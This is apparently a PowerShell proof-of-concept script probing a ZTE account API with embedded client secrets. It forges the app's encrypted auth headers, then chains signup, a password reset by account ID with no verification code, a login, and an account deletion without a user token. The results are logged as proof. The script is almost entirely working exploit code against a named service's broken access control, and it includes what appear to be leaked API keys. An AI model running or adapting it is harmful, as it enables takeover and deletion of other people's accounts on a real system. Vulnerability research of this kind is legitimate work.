param(
    [string]$BaseUrl = 'https://zxuacde.smart-zte.com/zte-sec-uac-iportalbff/external',
    [string]$AppClientKey = 'djrom(&)(&)MORJD',
    [string]$AppId = '271950143414',
    [string]$TenantId = '10001',
    [string]$AppSec = 'b2cfe28732612cfd81de7a22ace2034317a47eb94683a016a85cc0883597c625',
    [string]$AccessKey = '271950143414fnu4mb3lxxotfj5mi1tp',
    [string]$Country = '0054',
    [string]$Lang = 'en_US',
    [string]$LoginClientIp = '127.0.0.1',
    [string]$OutFile = '.\runtime-appauth-account-probes.json'
)

$ErrorActionPreference = 'Stop'

function ConvertTo-Base64([byte[]]$Bytes) {
    [Convert]::ToBase64String($Bytes)
}

function Get-Utf8Bytes([string]$Text) {
    [System.Text.Encoding]::UTF8.GetBytes($Text)
}

function Get-Sha256Hex([string]$Text) {
    $sha = [System.Security.Cryptography.SHA256]::Create()
    try {
        $hash = $sha.ComputeHash((Get-Utf8Bytes $Text))
        -join ($hash | ForEach-Object { $_.ToString('x2') })
    } finally {
        $sha.Dispose()
    }
}

function Invoke-AesGcmEncrypt {
    param(
        [Parameter(Mandatory = $true)][string]$Plaintext,
        [Parameter(Mandatory = $true)][string]$KeyText
    )
    $key = Get-Utf8Bytes $KeyText
    $nonce = New-Object byte[] 12
    [System.Security.Cryptography.RandomNumberGenerator]::Fill($nonce)
    $plain = Get-Utf8Bytes $Plaintext
    $cipher = New-Object byte[] $plain.Length
    $tag = New-Object byte[] 16
    $aes = [System.Security.Cryptography.AesGcm]::new($key, 16)
    try {
        $aes.Encrypt($nonce, $plain, $cipher, $tag)
    } finally {
        $aes.Dispose()
    }
    $combined = New-Object byte[] ($nonce.Length + $cipher.Length + $tag.Length)
    [Array]::Copy($nonce, 0, $combined, 0, $nonce.Length)
    [Array]::Copy($cipher, 0, $combined, $nonce.Length, $cipher.Length)
    [Array]::Copy($tag, 0, $combined, $nonce.Length + $cipher.Length, $tag.Length)
    ConvertTo-Base64 $combined
}

function Invoke-JsonPost {
    param(
        [Parameter(Mandatory = $true)][string]$Url,
        [Parameter(Mandatory = $true)][hashtable]$Headers,
        [Parameter(Mandatory = $true)]$Body
    )
    $json = if ($Body -is [string]) { $Body } else { $Body | ConvertTo-Json -Depth 20 -Compress }
    try {
        $resp = Invoke-WebRequest -Method Post -Uri $Url -Headers $Headers -ContentType 'application/json' -Body $json -UseBasicParsing
        [pscustomobject]@{
            status = [int]$resp.StatusCode
            text = [string]$resp.Content
            json = ($resp.Content | ConvertFrom-Json -Depth 100)
        }
    } catch {
        if ($_.Exception.Response) {
            $reader = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
            $content = $reader.ReadToEnd()
            [pscustomobject]@{
                status = [int]$_.Exception.Response.StatusCode
                text = [string]$content
                json = $(try { $content | ConvertFrom-Json -Depth 100 } catch { $null })
            }
        } else {
            throw
        }
    }
}

function Get-AppHeaders {
    $authMaterial = '{0},{1},{2},{3}' -f $AppSec, $AppId, $AccessKey, [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds()
    @{
        'X-Auth-Value' = (Invoke-AesGcmEncrypt -Plaintext $authMaterial -KeyText $AppClientKey)
        'X-Tenant-Id'  = $TenantId
        'X-App-Id'     = $AppId
        'X-Itp-Value'  = "accessKey=$AccessKey"
        'X-Lang-Id'    = $Lang
        'Connection'   = 'close'
    }
}

function Invoke-Verify {
    param([string]$Email)
    Invoke-JsonPost -Url "$BaseUrl/account/verify.serv" -Headers (Get-AppHeaders) -Body @{
        key = (Invoke-AesGcmEncrypt -Plaintext $Email -KeyText $AppClientKey)
    }
}

function Invoke-Signup {
    param([string]$Email, [string]$Password)
    Invoke-JsonPost -Url "$BaseUrl/account/person/signup.serv" -Headers (Get-AppHeaders) -Body @{
        email    = $Email
        password = $Password
        country  = $Country
    }
}

function Invoke-Login {
    param([string]$Email, [string]$Password)
    $encEmail = Invoke-AesGcmEncrypt -Plaintext $Email -KeyText $AppClientKey
    $encPass = Invoke-AesGcmEncrypt -Plaintext $Password -KeyText $AppClientKey
    $verifyCode = Get-Sha256Hex ($encEmail + $encPass + $LoginClientIp + $AppId)
    Invoke-JsonPost -Url "$BaseUrl/auth/login.serv" -Headers (Get-AppHeaders) -Body @{
        loginName       = $encEmail
        passWord        = $encPass
        loginSystemCode = $AppId
        loginClientIp   = $LoginClientIp
        verifyCode      = $verifyCode
    }
}

function Invoke-ResetPassword {
    param([string]$AccountId, [string]$NewPassword)
    Invoke-JsonPost -Url "$BaseUrl/account/password/reset.serv" -Headers (Get-AppHeaders) -Body @{
        accountId   = $AccountId
        newPassword = $NewPassword
    }
}

function Invoke-DeleteWithoutToken {
    param([string]$AccountId)
    $headers = Get-AppHeaders
    $headers['X-Emp-No'] = $AccountId
    Invoke-JsonPost -Url "$BaseUrl/account/delete.serv" -Headers $headers -Body @{
        accountId = $AccountId
    }
}

function New-RandomString {
    param([int]$Length = 10)
    $chars = 'abcdefghijklmnopqrstuvwxyz0123456789'
    -join (1..$Length | ForEach-Object { $chars[(Get-Random -Minimum 0 -Maximum $chars.Length)] })
}

$stamp = Get-Date -Format 'yyyyMMdd-HHmmss'
$email = "probe-test-$stamp@example.com"
$password1 = "Rt!$(New-RandomString)"
$password2 = "Rs!$(New-RandomString)"

$verifyBefore = Invoke-Verify -Email $email
$signup = Invoke-Signup -Email $email -Password $password1
$verifyAfter = Invoke-Verify -Email $email
$accountId = $verifyAfter.json.data.accountId
$reset = Invoke-ResetPassword -AccountId $accountId -NewPassword $password2
$loginNew = Invoke-Login -Email $email -Password $password2
$delete = Invoke-DeleteWithoutToken -AccountId $accountId
$verifyAfterDelete = Invoke-Verify -Email $email
$reregister = Invoke-Signup -Email $email -Password ("Rr!$(New-RandomString)")

$result = [ordered]@{
    timestamp_utc = [DateTime]::UtcNow.ToString('o')
    base = $BaseUrl
    runtime_values = [ordered]@{
        appClientKey = $AppClientKey
        appId = $AppId
        tenantId = $TenantId
        appSec = $AppSec
        accessKey = $AccessKey
    }
    proof_identity = [ordered]@{
        email = $email
        password_initial = $password1
        password_after_reset = $password2
    }
    verify_before = $verifyBefore
    signup = $signup
    verify_after = $verifyAfter
    reset_without_code = $reset
    login_after_reset = $loginNew
    delete_without_user_token = $delete
    verify_after_delete = $verifyAfterDelete
    reregister_after_delete = $reregister
}

$resolvedOutFile = [System.IO.Path]::GetFullPath((Join-Path $PWD $OutFile))
[System.IO.Directory]::CreateDirectory((Split-Path -Parent $resolvedOutFile)) | Out-Null
$result | ConvertTo-Json -Depth 20 | Set-Content -Path $resolvedOutFile -Encoding UTF8
Write-Output "Wrote $resolvedOutFile"
